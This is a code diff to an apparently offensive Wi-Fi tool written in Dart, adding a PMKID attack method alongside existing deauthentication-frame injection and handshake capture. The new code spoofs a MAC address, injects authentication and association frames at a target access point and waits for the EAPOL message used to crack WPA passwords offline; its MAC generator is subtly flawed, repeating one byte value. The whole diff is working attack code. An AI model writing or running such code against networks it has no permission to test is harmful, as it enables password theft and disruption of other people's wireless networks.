@@ -17,6 +17,7 @@ class TargetViewModel extends ChangeNotifier {
   final Set<String> _clients = {};
   PcapWriter? _pcapWriter;
   bool _handshakeCaptured = false;
+  String _myRandomMac = '00:11:22:33:44:55';
 
   StreamSubscription? _captureSub;
 
@@ -162,6 +163,38 @@ class TargetViewModel extends ChangeNotifier {
     }
     
     addLog('INJECTION: SENT $successCount/${_clients.length} DEAUTH FRAMES');
+  }
+
+  Future<void> injectPmkidAttack() async {
+    if (!_monitorActive) {
+      _errorMessage = 'MONITOR MODE MUST BE ACTIVE';
+      notifyListeners();
+      return;
+    }
+    
+    // Generate a new random MAC for each attack to avoid getting ignored
+    final randMac = List.generate(6, (index) => (DateTime.now().microsecondsSinceEpoch % 255).toRadixString(16).padLeft(2, '0')).join(':');
+    _myRandomMac = randMac;
+
+    addLog('STARTING PMKID ATTACK (SPOOFED MAC: $_myRandomMac)');
+    
+    // 1. Send Authentication Frame
+    final authFrame = PacketParser.craftAuth(target.bssid, _myRandomMac);
+    await NativeBridge.injectFrame(authFrame);
+    addLog('PMKID: SENT AUTHENTICATION');
+    
+    // Small delay to let AP process
+    await Future.delayed(const Duration(milliseconds: 100));
+    
+    // 2. Send Association Request
+    final assocFrame = PacketParser.craftAssocReq(target.bssid, _myRandomMac, target.ssid);
+    final ok = await NativeBridge.injectFrame(assocFrame);
+    
+    if (ok) {
+      addLog('PMKID: SENT ASSOC REQ (WAITING FOR EAPOL M1...)');
+    } else {
+      addLog('PMKID: INJECTION FAILED');
+    }
   }
 
   @override
